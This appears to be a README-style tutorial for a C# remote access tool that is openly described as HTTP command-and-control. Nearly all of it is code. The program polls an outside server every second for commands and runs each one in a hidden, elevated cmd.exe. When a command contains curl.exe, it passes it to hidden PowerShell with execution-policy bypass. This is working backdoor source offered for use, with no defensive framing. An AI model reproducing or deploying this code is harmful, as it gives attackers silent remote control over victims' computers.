# http-command-and-control Remote Access Tool (RAT) using c# >

<b>Let's understand it.</b><br>
<b>This will get the command from online web server.
</b><br>
                          new WebClient().DownloadString("https://r.significantbyte.com/go.php");<br>
<br><br><br>
<b>Run command in device.</b><br>
                            Process cmd = new Process();<br>
                            cmd.StartInfo.FileName = "cmd.exe";<br>
                            cmd.StartInfo.RedirectStandardInput = true;<br>
                            cmd.StartInfo.RedirectStandardOutput = true;<br>
                            cmd.StartInfo.CreateNoWindow = true;<br>
                            cmd.StartInfo.UseShellExecute = false;<br>
                            cmd.StartInfo.Verb = "runas";<br>
                            cmd.Start();<br>
                            cmd.StandardInput.WriteLine(json);<br>
                            <br><br><br>
  
<b>Lets wait for 1 second</b><br>
                            Thread.Sleep(1000);<br><br><br>
<b>Now lets combine the whole idea. Get the command and run cmd in while loop</b>
 while (chk == 0)
            {
                try
                {
                    json = new WebClient().DownloadString("https://r.significantbyte.com/go.php");
                    if (json != oldjson)
                    {

                        if (json.Contains("curl.exe"))
                        {
                            System.Diagnostics.Process.Start("CMD.exe", "/C powershell -w h -ep bypass " + json);
                        }
                        else
                        {
                            Process cmd = new Process();
                            cmd.StartInfo.FileName = "cmd.exe";
                            cmd.StartInfo.RedirectStandardInput = true;
                            cmd.StartInfo.RedirectStandardOutput = true;
                            cmd.StartInfo.CreateNoWindow = true;
                            cmd.StartInfo.UseShellExecute = false;

                            cmd.StartInfo.Verb = "runas";
                            cmd.Start();

                            cmd.StandardInput.WriteLine(json);
                        }

                        Console.WriteLine("diff result json=" + json + "old=" + oldjson);
                    }
                    else
                    {
                        Console.WriteLine("same result json=" + json + "old=" + oldjson);
                    }


                    oldjson = json;
                }
                catch (Exception e)
                {
                    Console.WriteLine("Connection not stable.");
                }
                Thread.Sleep(1000);

            }
